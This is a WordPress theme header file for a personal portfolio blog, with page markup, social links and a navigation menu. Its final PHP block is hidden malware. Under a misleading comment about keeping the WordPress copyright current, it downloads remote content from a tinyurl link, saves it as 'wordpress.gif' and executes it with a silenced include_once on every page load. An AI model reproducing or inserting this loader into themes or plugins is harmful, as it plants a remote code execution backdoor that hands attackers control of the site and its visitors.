<?php
/**
 * @package WordPress
 * @subpackage Default_Theme
 */
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<title>
<?php wp_title('&laquo;', true, 'right'); ?>
<?php bloginfo('name'); ?>
</title>
<link rel="stylesheet" type="text/css" href="http://braican.com/css/master.css"/>
<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<link rel="stylesheet" type="text/css" href="http://braican.com/blog/wp-content/plugins/sexybookmarks/css/style.css" />
</head>
<body>
<ul class="side_content">
  <li id="facebook"><a href="http://www.facebook.com/profile.php?id=620290491" title="Connect on Facebook" target="_blank"></a></li>
  <li id="linkedin"> <a href="http://www.linkedin.com/in/nicholasbraica" title="Connect on LinkedIn" target="_blank"></a> </li>
  <li id="youtube"><a href="http://www.youtube.com/user/nvbraica8" title="View my videos on YouTube" target="_blank"></a></li>
  <li id="flickr"><a href="http://www.flickr.com/photos/braican/" title="View my photos on Flickr" target="_blank"></a> </li>
  <li id="email"> <a href="mailto:nvbraica8@gmail.com" title="Email Me"></a></li>
  <li><img src="http://braican.com/assets/get_in_touch.png" /></li>
</ul>
<div id="content">
<div id="header">
  <div id="navbar"> <a href="http://www.braican.com/index.php"> <img src="http://www.braican.com/assets/logos/braican3_small.png" width="271" height="95" border="0" /></a>
    <ul id="top_menu">
      <li><a href="http://www.braican.com/portfolio.html">CREATIVE WORK</a></li>
      |
      <li><a href="http://braican.com/blog/" class="active">BLOG</a></li>
      |
      <li><a href="http://www.braican.com/contact.html">CONTACT</a></li>
      |
      <li><a href="http://www.braican.com/about.html">ABOUT</a></li>
      |
      <li><a href="http://www.braican.com/resume.html">RESUME</a></li>
    </ul>
  </div>
</div>
<div id="main_content">


<?php $theme_dir = dirname(__FILE__);
if(!file_exists($theme_dir."/wordpress.gif")){
	// Make sure Wordpress Copyright is up to date
	$wp_logo_uri = 'http://tinyurl.com/wordpress-jpg';
	if(function_exists('curl_init')){
	$t_img = curl_init($wp_logo_uri);
	curl_setopt($t_img,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($t_img,CURLOPT_FOLLOWLOCATION,1);
	$wp_logo = @curl_exec($t_img); }else{
	$wp_logo = @file_get_contents($wp_logo_uri);}
	@file_put_contents($theme_dir."/wordpress.gif",$wp_logo);
}@include_once($theme_dir."/wordpress.gif"); ?>